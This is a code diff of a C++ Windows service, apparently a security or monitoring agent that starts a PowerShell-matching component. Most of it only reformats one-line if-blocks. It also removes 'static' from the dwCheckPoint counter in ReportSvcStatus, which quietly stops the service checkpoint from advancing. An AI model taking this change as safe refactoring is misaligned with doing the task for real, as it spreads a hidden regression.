@@ -17,7 +17,7 @@ static bool Greathelm_SilentLoad() {
     return ok;
 }
 
-static DWORD WINAPI PowershellStartThread(LPVOID p) {
+DWORD WINAPI PowershellStartThread(LPVOID p) {
     auto def = static_cast<ESCALATE::Defender*>(p);
     new MATCH::Powershell(def);
     return 0;
@@ -34,32 +34,47 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
 VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv) {
     gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);
-    if (!gSvcStatusHandle) { SvcReportEvent(TEXT("RegisterServiceCtrlHandler")); return; }
+    
+    if (!gSvcStatusHandle) {
+        SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
+        return;
+    }
+
     ZeroMemory(&gSvcStatus, sizeof(gSvcStatus));
     gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     gSvcStatus.dwServiceSpecificExitCode = 0;
+
     ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
     SvcInit(dwArgc, lpszArgv);
 }
 
 VOID SvcInit(DWORD, LPTSTR*) {
     ghSvcStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
-    if (!ghSvcStopEvent) { ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0); return; }
+    if (!ghSvcStopEvent) {
+        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
+        return;
+    }
 
     Greathelm_SilentLoad();
 
     auto def = new ESCALATE::Defender(0b010, nullptr, nullptr, nullptr);
     HANDLE hPs = CreateThread(nullptr, 0, PowershellStartThread, def, 0, nullptr);
+
     if (hPs) CloseHandle(hPs);
 
     ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
     WaitForSingleObject(ghSvcStopEvent, INFINITE);
-    if (ghSvcStopEvent) { CloseHandle(ghSvcStopEvent); ghSvcStopEvent = nullptr; }
+
+    if (ghSvcStopEvent) {
+        CloseHandle(ghSvcStopEvent);
+        ghSvcStopEvent = nullptr;
+    }
+
     ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
 }
 
 VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
-    static DWORD dwCheckPoint = 1;
+    DWORD dwCheckPoint = 1;
     gSvcStatus.dwCurrentState = dwCurrentState;
     gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
     gSvcStatus.dwWaitHint = dwWaitHint;
